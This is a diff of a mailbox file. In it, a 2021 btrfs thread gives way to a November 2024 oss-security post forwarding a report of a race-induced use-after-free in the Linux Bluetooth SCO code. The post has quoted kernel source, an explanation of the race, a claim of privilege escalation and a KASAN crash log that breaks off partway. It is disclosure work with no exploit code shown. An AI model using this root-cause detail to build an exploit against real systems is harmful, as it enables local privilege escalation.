@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2085" "Wednesday" "1" "September" "2021" "14:38:33" "+0800" "butt3rflyh4ck" "butterflyhuangxx@gmail.com" nil "75" "Re: [oss-security] Linux kernel: fs/btrfs: null-ptr-dereference bug in btrfs_rm_device in fs/btrfs/volumes.c" nil nil nil "9" nil nil (number mark "U       butterflyhua Sep  1   75/2085  " thread-indent "\"Re: [oss-security] Linux kernel: fs/btrfs: null-ptr-dereference bug in btrfs_rm_device in fs/btrfs/volumes.c\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] Linux kernel: fs/btrfs: null-ptr-dereference bug in btrfs_rm_device in fs/btrfs/volumes.c" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 23596 invoked by uid 550); 1 Sep 2021 09:42:01 -0000
+Received: (qmail 27780 invoked by uid 550); 29 Nov 2024 04:41:56 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,119 +7,1009 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 1663 invoked from network); 1 Sep 2021 06:38:55 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
-         :content-transfer-encoding;
-        bh=QbklDYyyFBiTaCm2qLTeayTl+eX8obqzl9DQgqgAUlc=;
-        b=JL3MKdmxYh5RaWFYDR51P/6bE79wQtTPspKGTcJoUlb/F/mYvyoUf63SZVSiJkqg4V
-         6u/J40m0ue4SDri4sJX+Qp61H4OFNiOYQeE2SEdzRUAS0yNtdTceyW3HcMi4ydd1aV3g
-         1AooJmHTEeaKgkz/gyPDmh5dhPl6ZoAnxJzNjLurYr5EcRkWv1ijIvcHAv7KSVafbmIQ
-         BH9WY8Juehb+A98IEq4LQVFGUBzHRy5QzvoOojEQWHP9QDxnqeQzjzUoLy+N6Y5sLNbI
-         Qg9kuIpD/dc4o04PoMdqcCUB63WtvWlQ4ODEmp7petc067nmAbEm3j1GaX2Y6kfDw9ti
-         +lcQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to:content-transfer-encoding;
-        bh=QbklDYyyFBiTaCm2qLTeayTl+eX8obqzl9DQgqgAUlc=;
-        b=uO3uPHyNmVbsWUxHHoK+d0MsaoIyOpWdXBS19NUefSDsBT6H6Tzh+ntZREZdoX+YH4
-         fPID/WrpGnJOjG9/TKH0YJ1r8CZK1KHDAc28ByYRFWhVUNOvq40iweCJDu9kR9K7z8ya
-         eWwmEmbCXqkslHZTWleh5AVi+67pgQO5mFAaxWKeRQaMw9zZFg3pgSZ/BvyisJgKNjq2
-         NI4c8wTCim7iV3xVyi6+9HT7AMWh83FDNtManFxMF6bpLW1aPmYn4GPwoAaPuUZrk9wd
-         niTqhw9outkMQhAmjUsjPN5orE6fT7uAYrZQY/0X5inkpvJWifY1MRb9Hu4t4FIebPuf
-         3OCg==
-X-Gm-Message-State: AOAM5329ATuaHwfCKAuoZ9XMDHf3d+wd5kOXfdZJYxNzSObAtcj5JLjD
-	U8o38tRxHqp2SxyjcCQXvffM2c5zm3alBX9owP5ISFoSNhhpgJQo
-X-Google-Smtp-Source: ABdhPJxdqzI4jQZX30FydqCzq5l2Ug4NZD3+E0fvUqQr1TiA5dpJybaMvE8fhhtxUofa2IfJQtlOCN911QQT9a0Shr4=
-X-Received: by 2002:a25:e70a:: with SMTP id e10mr33789480ybh.302.1630478323935;
- Tue, 31 Aug 2021 23:38:43 -0700 (PDT)
-MIME-Version: 1.0
-References: <CAFcO6XP=t-BCX=NP=B6qH5WVQ1jc=pOS24d0d=6MS2dm66A_mQ@mail.gmail.com>
- <CAFcO6XNHPFyFvFUJhPVQ+YHLZw=fnxGoig+ZjWjv7rXZcxmX2g@mail.gmail.com>
-In-Reply-To: <CAFcO6XNHPFyFvFUJhPVQ+YHLZw=fnxGoig+ZjWjv7rXZcxmX2g@mail.gmail.com>
-From: butt3rflyh4ck <butterflyhuangxx@gmail.com>
-Date: Wed, 1 Sep 2021 14:38:33 +0800
-Message-ID: <CAFcO6XM70_Zwo6JuhkH53DCtRmWSTXc616gi4sfuwOyxPAAvzA@mail.gmail.com>
+x-ms-reactions: disallow
+Received: (qmail 26300 invoked from network); 29 Nov 2024 04:41:39 -0000
+Date: Fri, 29 Nov 2024 05:40:32 +0100
+From: Solar Designer <solar@openwall.com>
 To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-Subject: Re: [oss-security] Linux kernel: fs/btrfs: null-ptr-dereference bug
- in btrfs_rm_device in fs/btrfs/volumes.c
+Cc: tianshu qiu <jimuchutianshu97@gmail.com>,
+	Marcel Holtmann <marcel@holtmann.org>,
+	Johan Hedberg <johan.hedberg@gmail.com>,
+	Luiz Augusto von Dentz <luiz.dentz@gmail.com>
+Message-ID: <20241129044032.GA5009@openwall.com>
+Mime-Version: 1.0
+Content-Type: multipart/mixed; boundary="M9NhX3UHpAaciwkO"
+Content-Disposition: inline
+User-Agent: Mutt/1.4.2.3i
+Subject: [oss-security] Linux: Race can lead to UAF in net/bluetooth/sco.c: sco_sock_connect()
 
-The patch for this issue is available upstream.
+--M9NhX3UHpAaciwkO
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?=
-id=3De4571b8c5e9ffa1e85c0c671995bd4dcc5c75091
+Hi,
 
+Upon expiration of the maximum of 14 days embargo, I am forwarding a
+vulnerability report (and a couple of replies) that was erroneously
+sent to the linux-distros list and then was not fully handled.  We
+require information actionable for the distros within the maximum of 14
+days, which generally means that the upstream should be contacted first
+and should have a fix ready for the distros to include (or at least
+should expect that by the proposed public disclosure date).  The
+specific wording we use is:
 
-Regards,
- butt3rflyh4ck.
+"For Linux kernel issues, you must notify the kernel security team first,
+wait for the fix, and only then notify linux-distros or oss-security
+(depending on whether the information is still private or already
+public, as well as on issue severity)."
 
-On Thu, Aug 26, 2021 at 5:36 PM butt3rflyh4ck
-<butterflyhuangxx@gmail.com> wrote:
->
-> Hi, RedHat has assigned  CVE-2021-3739   to this issue.
->
-> https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2021-3739.
->
-> Please track the below link for more information.
-> https://bugzilla.redhat.com/show_bug.cgi?id=3D1997958
->
+While we assume good faith even if the report is misaddressed (which we
+understand does happen as instructions are naturally more complicated
+than we'd have liked), unfortunately this time the reporter also did not
+reply to any of linux-distros' members questions, most notably "have you
+contacted either security@kernel.org or the bluetooth maintainers about
+this issue?"  Ideally, someone from linux-distros should have taken over
+and handled this fully - including asking s@k.o and the maintainers
+directly - but unfortunately this also did not happen this time.
+
+As you can see from the messages below, the issue may be the same as
+CVE-2024-27398 fixed by commit 483bc08181827fc475643272ffb69c533007e546
+("Bluetooth: Fix use-after-free bugs caused by sco_sock_timeout").  The
+report claims that the "race condition bug has not been solved yet" by
+this commit, but then the only testing appears to have been on a kernel
+pre-dating this commit.
+
+I'm also attaching here some of the files from the reporter's referenced
+GitHub repo.  The main claimed PoC is a 9 MB file Linux-6.8.0-PoC.webm,
+not attached here, but I do attach the proposed patch, test.c "test case
+after patch" (as the commit message said), and most-relevant files from
+inside PoC.zip.  I preserved the filenames, but edited the Makefile and
+#include directives to avoid dependency on otherwise-unused files.  Both
+programs (test.c and poc.c) build for me on Rocky Linux 9.5 with
+bluez-libs-devel and fuse-devel installed.  I did not try running them.
+
+On a related note, my searching Linux kernel mailing lists for related
+keywords finds other issues also in Bluetooth and even specifically in
+SCO triggered by syzbot and with recent proposed patches:
+
+2024-11-25 13:16 [syzbot] [bluetooth?] KASAN: slab-use-after-free Read in sco_sock_connect syzbot
+2024-11-25 23:58 ` [PATCH] Bluetooth: SCO: remove the redundant sco_conn_put Edward Adam Davis
+
+Alexander
+
+From: tianshu qiu <jimuchutianshu97@gmail.com>
+To: linux-distros
+Subject: [vs-plain] Race condition vulnerability that can lead to UAF in net/bluetooth/sco.c:sco_sock_connect
+Date: Thu, 14 Nov 2024 18:35:24 +0800
+
+On Thu, Nov 14, 2024 at 06:35:24PM +0800, tianshu qiu wrote:
+> The bug was introduced on Apr 11, 2023:
+> https://github.com/torvalds/linux/commit/9a8ec9e8ebb5a7c0cfbce2d6b4a6b67b2b78e8f3
+> 
+> =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*= BUG DETAILS
+> =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> 
+> I found the bug when looking for unlocked access to ???struct sock???
+> objects in the ???net??? directory. I think that "struct sock" is shared
+> among multiple threads.
+> Access to struct sock object, especially reading and writing sk
+> ->sk_state, should call lock_sock(sk) in advance to lock, and call
+> release_sock(sk) to
+> unlock after the last access to ???struct sock??? object, so as to prevent
+> race between threads.
+> 
+> =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> 
+> static int sco_sock_connect(struct socket *sock, struct sockaddr
+> *addr, int alen, int flags)
+> {
+>         struct sockaddr_sco *sa = (struct sockaddr_sco *) addr;
+>         struct sock *sk = sock->sk;
+>         int err;
+> 
+>         BT_DBG("sk %p", sk);
+> 
+>         if (alen < sizeof(struct sockaddr_sco) ||
+>         addr->sa_family != AF_BLUETOOTH)
+>         return -EINVAL;
+> 
+>         if (sk->sk_state != BT_OPEN && sk->sk_state != BT_BOUND)
+>                 return -EBADFD;
+> 
+>         if (sk->sk_type != SOCK_SEQPACKET)
+>                 err = -EINVAL;
+> 
+>         lock_sock(sk);
+>               // first lock-release pair
+>         /* Set destination address and psm */
+>         bacpy(&sco_pi(sk)->dst, &sa->sco_bdaddr);
+>         release_sock(sk);
+>            // first lock-release pair
+> 
+>         err = sco_connect(sk);
+>         if (err)
+>                 return err;
+> 
+>         lock_sock(sk);
+>                  // second lock-release pair
+> 
+>         err = bt_sock_wait_state(sk, BT_CONNECTED,
+>         sock_sndtimeo(sk, flags & O_NONBLOCK));
+> 
+>         release_sock(sk);
+>              // second lock-release pair
+>         return err;
+> }
+> 
+> 
+> 
+> static int sco_connect(struct sock *sk)
+> {
+>         struct sco_conn *conn;
+>         struct hci_conn *hcon;
+>         struct hci_dev  *hdev;
+> 
+>         ??????
+> 
+>         hdev = hci_get_route(&sco_pi(sk)->dst, &sco_pi(sk)->src, BDADDR_BREDR);
+>         if (!hdev)
+>                 return -EHOSTUNREACH;
+> 
+>         hci_dev_lock(hdev);
+> 
+>         ??????
+> 
+>         hcon = hci_connect_sco(hdev, type, &sco_pi(sk)->dst,
+>         sco_pi(sk)->setting, &sco_pi(sk)->codec);
+> 
+>         ??????
+> 
+>         lock_sock(sk);
+>                  // third lock-release pair
+> 
+>         err = sco_chan_add(conn, sk, NULL);
+>         if (err) {
+>                 release_sock(sk);
+>                 goto unlock;
+>         }
+> 
+>         /* Update source addr of the socket */
+>         bacpy(&sco_pi(sk)->src, &hcon->src);
+> 
+>         if (hcon->state == BT_CONNECTED) {
+>                 sco_sock_clear_timer(sk);
+>                 sk->sk_state = BT_CONNECTED;
+>         } else {
+>                 sk->sk_state = BT_CONNECT;
+>                 sco_sock_set_timer(sk, sk->sk_sndtimeo);
+>         }
+> 
+>         release_sock(sk);
+>              // third lock-release pair
+> 
+>         ......
+> 
+> }
+> 
+> =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> 
+> To avoid possible circular locking, the commit that introduced the bug
+> splits the "lock-release" pair which protects the whole
+> sco_sock_connect to three parts.
+> 
+> The "if" branch for determining sk ->sk_state in sco_sock_connect is
+> exposed outside the lock_sock(sk) protection, which can lead to race
+> condition if two threads
+> execute ???connect??? system calls simultaneously.
+> This will lead to dangling ???struct sco_conn??? object in the function
+> sco_chan_add, the calling procedure is:
+> sco_sock_connect -> sco_connect -> sco_chan_add -> __sco_chan_add.
+> 
+> The timer associated to this dangling ???struct sco_conn??? object is
+> still work, even if the "struct sock" object was freed by the system
+> call "close", which will cause
+> UAF when timeout is reached.
+> 
+> Although the following two commits attempt to solve the UAF issue in
+> sco_sock_timeout, race condition bug has not been solved yet:
+> 
+> https://github.com/torvalds/linux/commit/1bf4470a3939c678fb822073e9ea77a0560bc6bb
+> https://github.com/torvalds/linux/commit/483bc08181827fc475643272ffb69c533007e546
+> 
+> This is a serious vulnerability that can cause local privilege
+> escalation. I hope this vulnerability can be patched and assigned a
+> CVE number.
+> 
+> =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> DMESG LOG =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> 
+> 
+> [ 1084.906919] BUG: KASAN: slab-use-after-free in sco_conn_del+0xa6/0x220
+> [ 1084.906940] Write of size 4 at addr ffff888122c06880 by task
+> kworker/u265:0/162
+> 
+> [ 1084.906955] CPU: 0 PID: 162 Comm: kworker/u265:0 Not tainted 6.8.0 #4
+> [ 1084.906966] Hardware name: VMware, Inc. VMware Virtual
+> Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020
+> [ 1084.906974] Workqueue: hci0 hci_rx_work
+> [ 1084.906991] Call Trace:
+> [ 1084.906996]  <TASK>
+> [ 1084.907004]  dump_stack_lvl+0x48/0x70
+> [ 1084.907018]  print_report+0xd2/0x670
+> [ 1084.907028]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+> [ 1084.907039]  ? kasan_complete_mode_report_info+0x8a/0x230
+> [ 1084.907052]  kasan_report+0xd7/0x120
+> [ 1084.907060]  ? sco_conn_del+0xa6/0x220
+> [ 1084.907070]  ? sco_conn_del+0xa6/0x220
+> [ 1084.907082]  kasan_check_range+0x11c/0x200
+> [ 1084.907092]  __kasan_check_write+0x14/0x30
+> [ 1084.907103]  sco_conn_del+0xa6/0x220
+> [ 1084.907114]  sco_connect_cfm+0x1d4/0xac0
+> [ 1084.907125]  ? __pfx_sco_connect_cfm+0x10/0x10
+> [ 1084.907135]  ? __pfx_mutex_lock+0x10/0x10
+> [ 1084.907147]  hci_sco_setup+0x397/0x570
+> [ 1084.907157]  ? __pfx_hci_sco_setup+0x10/0x10
+> [ 1084.907165]  ? __pfx_mutex_lock+0x10/0x10
+> [ 1084.907176]  hci_conn_complete_evt+0x957/0x1150
+> [ 1084.907186]  ? kasan_save_track+0x14/0x40
+> [ 1084.907196]  ? __pfx_hci_conn_complete_evt+0x10/0x10
+> [ 1084.907205]  ? __kasan_check_write+0x14/0x30
+> [ 1084.907216]  ? mutex_unlock+0x81/0xe0
+> [ 1084.907224]  ? __pfx_mutex_unlock+0x10/0x10
+> [ 1084.907235]  hci_event_packet+0x818/0x1080
+> [ 1084.907246]  ? __pfx_hci_conn_complete_evt+0x10/0x10
+> [ 1084.907256]  ? __pfx_hci_event_packet+0x10/0x10
+> [ 1084.907266]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+> [ 1084.907275]  ? __pfx_hci_cmd_sync_complete+0x10/0x10
+> [ 1084.907286]  ? __kasan_check_read+0x11/0x20
+> [ 1084.907297]  hci_rx_work+0x312/0xd60
+> [ 1084.907308]  ? __pfx__raw_spin_lock_irq+0x10/0x10
+> [ 1084.907318]  process_one_work+0x577/0xd30
+> [ 1084.907371]  ? _raw_spin_lock_irq+0x8b/0x100
+> [ 1084.907384]  worker_thread+0x879/0x15a0
+> [ 1084.907392]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+> [ 1084.907403]  ? __pfx_worker_thread+0x10/0x10
+> [ 1084.907411]  kthread+0x2b7/0x390
+> [ 1084.907421]  ? __pfx_kthread+0x10/0x10
+> [ 1084.907431]  ret_from_fork+0x44/0x90
+> [ 1084.907442]  ? __pfx_kthread+0x10/0x10
+> [ 1084.907451]  ret_from_fork_asm+0x1b/0x30
+> [ 1084.907497]  </TASK>
+> 
+> [ 1084.907506] Allocated by task 3974:
+> [ 1084.907513]  kasan_save_stack+0x39/0x70
+> [ 1084.907522]  kasan_save_track+0x14/0x40
+> [ 1084.907527]  kasan_save_alloc_info+0x37/0x60
+> [ 1084.907537]  __kasan_kmalloc+0xc3/0xd0
+> [ 1084.907543]  __kmalloc+0x21f/0x530
+> [ 1084.907551]  sk_prot_alloc+0x16d/0x220
+> [ 1084.907560]  sk_alloc+0x35/0x750
+> [ 1084.907568]  bt_sock_alloc+0x2f/0x360
+> [ 1084.907576]  sco_sock_create+0xc6/0x390
+> [ 1084.907617]  bt_sock_create+0x152/0x320
+> [ 1084.907629]  __sock_create+0x212/0x500
+> [ 1084.907636]  __sys_socket+0x139/0x210
+> [ 1084.907670]  __x64_sys_socket+0x72/0xc0
+> [ 1084.907677]  do_syscall_64+0x82/0x180
+> [ 1084.907684]  entry_SYSCALL_64_after_hwframe+0x6e/0x76
+> 
+> [ 1084.907750] Freed by task 3974:
+> [ 1084.907755]  kasan_save_stack+0x39/0x70
+> [ 1084.907760]  kasan_save_track+0x14/0x40
+> [ 1084.907764]  kasan_save_free_info+0x3b/0x60
+> [ 1084.907769]  poison_slab_object+0x10a/0x180
+> [ 1084.907773]  __kasan_slab_free+0x33/0x60
+> [ 1084.907777]  kfree+0xda/0x2f0
+> [ 1084.907782]  __sk_destruct+0x44e/0x640
+> [ 1084.907787]  sk_destruct+0xaa/0xd0
+> [ 1084.907792]  __sk_free+0xa5/0x300
+> [ 1084.907797]  sk_free+0x50/0x80
+> [ 1084.907802]  sco_sock_kill+0x12e/0x160
+> [ 1084.907808]  sco_sock_release+0x134/0x290
+> [ 1084.907813]  __sock_release+0xac/0x270
+> [ 1084.907817]  sock_close+0x15/0x30
+> [ 1084.907821]  __fput+0x205/0xa90
+> [ 1084.907825]  __fput_sync+0x3a/0x50
+> [ 1084.907829]  __x64_sys_close+0x7e/0xe0
+> [ 1084.907835]  do_syscall_64+0x82/0x180
+> [ 1084.907839]  entry_SYSCALL_64_after_hwframe+0x6e/0x76
+> 
+> [ 1084.907847] The buggy address belongs to the object at ffff888122c06800
+>          which belongs to the cache kmalloc-rnd-04-1k of size 1024
+> [ 1084.907852] The buggy address is located 128 bytes inside of
+>          freed 1024-byte region [ffff888122c06800, ffff888122c06c00)
+> 
+> [ 1084.907861] The buggy address belongs to the physical page:
+> [ 1084.907865] page:00000000dd0be509 refcount:1 mapcount:0
+> mapping:0000000000000000 index:0x0 pfn:0x122c00
+> [ 1084.907871] head:00000000dd0be509 order:3 entire_mapcount:0
+> nr_pages_mapped:0 pincount:0
+> [ 1084.907876] flags:
+> 0x17ffffc0000840(slab|head|node=0|zone=2|lastcpupid=0x1fffff)
+> [ 1084.907882] page_type: 0xffffffff()
+> [ 1084.907887] raw: 0017ffffc0000840 ffff88810004f040 dead000000000122
+> 0000000000000000
+> [ 1084.907892] raw: 0000000000000000 0000000080100010 00000001ffffffff
+> 0000000000000000
+> [ 1084.907895] page dumped because: kasan: bad access detected
+> 
+> [ 1084.907900] Memory state around the buggy address:
+> [ 1084.907904]  ffff888122c06780: fc fc fc fc fc fc fc fc fc fc fc fc
+> fc fc fc fc
+> [ 1084.907908]  ffff888122c06800: fa fb fb fb fb fb fb fb fb fb fb fb
+> fb fb fb fb
+> [ 1084.907913] >ffff888122c06880: fb fb fb fb fb fb fb fb fb fb fb fb
+> fb fb fb fb
+> [ 1084.907916]                    ^
+> [ 1084.907920]  ffff888122c06900: fb fb fb fb fb fb fb fb fb fb fb fb
+> fb fb fb fb
+> [ 1084.907923]  ffff888122c06980: fb fb fb fb fb fb fb fb fb fb fb fb
+> fb fb fb fb
+> [ 1084.907927] ==================================================================
+> [ 1084.908048] Disabling lock debugging due to kernel taint
+> [ 1084.908054] ------------[ cut here ]------------
+> [ 1084.908057] refcount_t: addition on 0; use-after-free.
+> [ 1084.908141] WARNING: CPU: 0 PID: 162 at lib/refcount.c:25
+> refcount_warn_saturate+0x171/0x1a0
+> [ 1084.908174] Modules linked in: isofs snd_seq_dummy snd_hrtimer qrtr
+> intel_rapl_msr intel_rapl_common intel_uncore_frequency_common
+> intel_pmc_core intel_vsec pmt_telemetry pmt_class crct10dif_pclmul
+> polyval_clmulni snd_ens1371 polyval_generic snd_ac97_codec
+> ghash_clmulni_intel gameport sha256_ssse3 ac97_bus vmw_balloon
+> sha1_ssse3 snd_pcm aesni_intel uvcvideo crypto_simd snd_seq_midi
+> cryptd rapl snd_seq_midi_event videobuf2_vmalloc uvc snd_rawmidi
+> videobuf2_memops videobuf2_v4l2 snd_seq snd_seq_device videodev
+> snd_timer videobuf2_common snd mc btusb btmtk soundcore i2c_piix4
+> input_leds joydev mac_hid serio_raw vsock_loopback binfmt_misc
+> vmw_vsock_virtio_transport_common vmw_vsock_vmci_transport vsock
+> vmw_vmci sch_fq_codel ramoops reed_solomon vmwgfx drm_ttm_helper ttm
+> msr parport_pc ppdev lp parport efi_pstore nfnetlink dmi_sysfs
+> ip_tables x_tables autofs4 hid_generic crc32_pclmul usbhid psmouse
+> mptspi mptscsih e1000 ahci mptbase libahci scsi_transport_spi
+> pata_acpi floppy
+> [ 1084.908607] CPU: 0 PID: 162 Comm: kworker/u265:0 Tainted: G    B
+>           6.8.0 #4
+> [ 1084.908614] Hardware name: VMware, Inc. VMware Virtual
+> Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020
+> [ 1084.908618] Workqueue: hci0 hci_rx_work
+> [ 1084.908627] RIP: 0010:refcount_warn_saturate+0x171/0x1a0
+> [ 1084.908634] Code: 1d 81 1a eb 03 80 fb 01 0f 87 13 6f df 01 83 e3
+> 01 0f 85 4f ff ff ff 48 c7 c7 40 1c aa 84 c6 05 61 1a eb 03 01 e8 ef
+> de c3 fe <0f> 0b e9 35 ff ff ff 48 89 df e8 f0 99 59 ff e9 bc fe ff ff
+> 48 c7
+> [ 1084.908639] RSP: 0018:ffff888134717940 EFLAGS: 00010246
+> [ 1084.908644] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 0000000000000000
+> [ 1084.908648] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
+> [ 1084.908651] RBP: ffff888134717950 R08: 0000000000000000 R09: 0000000000000000
+> [ 1084.908654] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000002
+> [ 1084.908657] R13: ffff888104589000 R14: ffff888104589780 R15: ffff88810033dc08
+> [ 1084.908661] FS:  0000000000000000(0000) GS:ffff8881f3200000(0000)
+> knlGS:0000000000000000
+> [ 1084.908665] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+> [ 1084.908669] CR2: 000062bcbcecc5a0 CR3: 000000011de7a002 CR4: 00000000003706f0
+> [ 1084.908673] Call Trace:
+> [ 1084.908692]  <TASK>
+> [ 1084.908695]  ? show_regs+0x6d/0x80
+> [ 1084.908702]  ? __warn+0xcd/0x270
+> [ 1084.908706]  ? refcount_warn_saturate+0x171/0x1a0
+> [ 1084.908710]  ? report_bug+0x288/0x310
+> [ 1084.908715]  ? vprintk_default+0x1d/0x30
+> [ 1084.908720]  ? handle_bug+0x9f/0xd0
+> [ 1084.908724]  ? exc_invalid_op+0x18/0x50
+> [ 1084.908728]  ? asm_exc_invalid_op+0x1b/0x20
+> [ 1084.908736]  ? refcount_warn_saturate+0x171/0x1a0
+> [ 1084.908741]  sco_conn_del+0x1ef/0x220
+> [ 1084.908746]  sco_connect_cfm+0x1d4/0xac0
+> [ 1084.908751]  ? __pfx_sco_connect_cfm+0x10/0x10
+> [ 1084.908756]  ? __pfx_mutex_lock+0x10/0x10
+> [ 1084.908762]  hci_sco_setup+0x397/0x570
+> [ 1084.908766]  ? __pfx_hci_sco_setup+0x10/0x10
+> [ 1084.908769]  ? __pfx_mutex_lock+0x10/0x10
+> [ 1084.908774]  hci_conn_complete_evt+0x957/0x1150
+> [ 1084.908779]  ? kasan_save_track+0x14/0x40
+> [ 1084.908784]  ? __pfx_hci_conn_complete_evt+0x10/0x10
+> [ 1084.908788]  ? __kasan_check_write+0x14/0x30
+> [ 1084.908793]  ? mutex_unlock+0x81/0xe0
+> [ 1084.908797]  ? __pfx_mutex_unlock+0x10/0x10
+> [ 1084.908802]  hci_event_packet+0x818/0x1080
+> [ 1084.908807]  ? __pfx_hci_conn_complete_evt+0x10/0x10
+> [ 1084.908812]  ? __pfx_hci_event_packet+0x10/0x10
+> [ 1084.908816]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+> [ 1084.908820]  ? __pfx_hci_cmd_sync_complete+0x10/0x10
+> [ 1084.908825]  ? __kasan_check_read+0x11/0x20
+> [ 1084.908831]  hci_rx_work+0x312/0xd60
+> [ 1084.908836]  ? __pfx__raw_spin_lock_irq+0x10/0x10
+> [ 1084.908841]  process_one_work+0x577/0xd30
+> [ 1084.908844]  ? _raw_spin_lock_irq+0x8b/0x100
+> [ 1084.908850]  worker_thread+0x879/0x15a0
+> [ 1084.908853]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+> [ 1084.908859]  ? __pfx_worker_thread+0x10/0x10
+> [ 1084.908862]  kthread+0x2b7/0x390
+> [ 1084.908867]  ? __pfx_kthread+0x10/0x10
+> [ 1084.908871]  ret_from_fork+0x44/0x90
+> [ 1084.908876]  ? __pfx_kthread+0x10/0x10
+> [ 1084.908880]  ret_from_fork_asm+0x1b/0x30
+> [ 1084.908886]  </TASK>
+> [ 1084.908888] ---[ end trace 0000000000000000 ]---
+> [ 1084.908894] ------------[ cut here ]------------
+> [ 1084.908896] refcount_t: underflow; use-after-free.
+> [ 1084.908937] WARNING: CPU: 0 PID: 162 at lib/refcount.c:28
+> refcount_warn_saturate+0x13e/0x1a0
+> [ 1084.908946] Modules linked in: isofs snd_seq_dummy snd_hrtimer qrtr
+> intel_rapl_msr intel_rapl_common intel_uncore_frequency_common
+> intel_pmc_core intel_vsec pmt_telemetry pmt_class crct10dif_pclmul
+> polyval_clmulni snd_ens1371 polyval_generic snd_ac97_codec
+> ghash_clmulni_intel gameport sha256_ssse3 ac97_bus vmw_balloon
+> sha1_ssse3 snd_pcm aesni_intel uvcvideo crypto_simd snd_seq_midi
+> cryptd rapl snd_seq_midi_event videobuf2_vmalloc uvc snd_rawmidi
+> videobuf2_memops videobuf2_v4l2 snd_seq snd_seq_device videodev
+> snd_timer videobuf2_common snd mc btusb btmtk soundcore i2c_piix4
+> input_leds joydev mac_hid serio_raw vsock_loopback binfmt_misc
+> vmw_vsock_virtio_transport_common vmw_vsock_vmci_transport vsock
+> vmw_vmci sch_fq_codel ramoops reed_solomon vmwgfx drm_ttm_helper ttm
+> msr parport_pc ppdev lp parport efi_pstore nfnetlink dmi_sysfs
+> ip_tables x_tables autofs4 hid_generic crc32_pclmul usbhid psmouse
+> mptspi mptscsih e1000 ahci mptbase libahci scsi_transport_spi
+> pata_acpi floppy
+> [ 1084.909076] CPU: 0 PID: 162 Comm: kworker/u265:0 Tainted: G    B
+> W          6.8.0 #4
+> [ 1084.909081] Hardware name: VMware, Inc. VMware Virtual
+> Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020
+> [ 1084.909084] Workqueue: hci0 hci_rx_work
+> [ 1084.909090] RIP: 0010:refcount_warn_saturate+0x13e/0x1a0
+> [ 1084.909094] Code: eb 97 0f b6 1d af 1a eb 03 80 fb 01 0f 87 56 6f
+> df 01 83 e3 01 75 82 48 c7 c7 a0 1c aa 84 c6 05 93 1a eb 03 01 e8 22
+> df c3 fe <0f> 0b e9 68 ff ff ff 0f b6 1d 81 1a eb 03 80 fb 01 0f 87 13
+> 6f df
+> [ 1084.909097] RSP: 0018:ffff888134717940 EFLAGS: 00010246
+> [ 1084.909101] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 0000000000000000
+> [ 1084.909103] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
+> [ 1084.909106] RBP: ffff888134717950 R08: 0000000000000000 R09: 0000000000000000
+> [ 1084.909108] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000003
+> [ 1084.909110] R13: ffff888104589000 R14: ffff888104589780 R15: ffff88810033dc08
+> [ 1084.909113] FS:  0000000000000000(0000) GS:ffff8881f3200000(0000)
+> knlGS:0000000000000000
+> [ 1084.909116] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+> [ 1084.909119] CR2: 000062bcbcecc5a0 CR3: 000000011de7a002 CR4: 00000000003706f0
+> [ 1084.909122] Call Trace:
+> [ 1084.909124]  <TASK>
+> [ 1084.909127]  ? show_regs+0x6d/0x80
+> [ 1084.909132]  ? __warn+0xcd/0x270
+> [ 1084.909137]  ? refcount_warn_saturate+0x13e/0x1a0
